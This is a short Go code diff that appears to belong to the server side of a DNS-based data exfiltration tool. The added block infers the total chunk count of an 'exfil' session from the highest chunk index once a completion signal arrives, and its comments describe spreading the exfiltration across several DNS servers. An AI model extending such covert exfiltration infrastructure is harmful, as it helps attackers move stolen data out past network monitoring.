@@ -722,6 +722,24 @@ func (d *MasterDatabase) tryAssembleExfilTransferTx(tx *sql.Tx, sessionID string
 		}
 	}
 
+	// SHADOW MESH: If total is still 0 but we have a completion signal, infer total from max chunk index
+	// This handles distributed exfil where metadata went to one DNS server and completion to another
+	if total == 0 {
+		// Check if we have a pending completion signal (indicates exfil-client finished sending)
+		var hasCompletion int
+		tx.QueryRow(`SELECT 1 FROM pending_exfil_completions WHERE session_id = ?`, sessionID).Scan(&hasCompletion)
+		if hasCompletion == 1 {
+			// Infer total from the max chunk index
+			var maxIdx int
+			tx.QueryRow(`SELECT COALESCE(MAX(chunk_index), 0) FROM exfil_chunks WHERE session_id = ?`, sessionID).Scan(&maxIdx)
+			if maxIdx > 0 {
+				total = maxIdx
+				fmt.Printf("[Master DB] Exfil %s: Inferred total_chunks=%d from max chunk index (completion signal received)\n", sessionID, total)
+				tx.Exec(`UPDATE exfil_transfers SET total_chunks = ? WHERE session_id = ? AND total_chunks = 0`, total, sessionID)
+			}
+		}
+	}
+
 	if total == 0 {
 		return false, nil
 	}
